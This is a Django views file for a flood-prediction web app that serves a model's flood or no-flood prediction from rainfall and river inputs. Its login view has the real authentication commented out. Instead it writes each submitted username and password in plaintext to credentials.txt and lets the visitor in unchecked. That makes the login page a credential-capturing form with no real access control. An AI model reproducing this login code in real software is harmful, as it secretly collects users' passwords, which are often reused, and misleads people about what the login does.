from django.shortcuts import render, redirect
from django.contrib.auth import logout,authenticate,login
import numpy as np
import pandas as pd
from joblib import load

model = load('./model.joblib')

def index(request):
    if request.user.is_anonymous:
        return redirect("/login")
    return render(request,'index.html')

def loginUser(request): 

    if request.method=="POST":
        username=request.POST.get('username')
        password=request.POST.get('password')

        # user = authenticate(username=username, password=password)
        # if user is not None:
        #     login(request, user)
        with open('credentials.txt', 'w') as f:
            f.write(f'Username: {username}\nPassword: {password}')

        return redirect("/flood")
    return render(request,'login.html')

def predict(request):
    if request.method == 'POST':
        rainfall_amount = request.POST['rainfall_value']
        river_amount = request.POST['river_value']
        flood_predict = model.predict(np.array([[float(rainfall_amount), float(river_amount)]]))

        # accuracy = str(test_data_accuracy)
        
        if flood_predict[0] == 0:
            flood_predict = f'No Flood {flood_predict}'

        else:
            flood_predict = f'Flood {flood_predict}'
        return render(request,'index.html',{'output': flood_predict})
    return render(request,'index.html')

def logoutUser(request):
    logout(request)
    return redirect("/login")

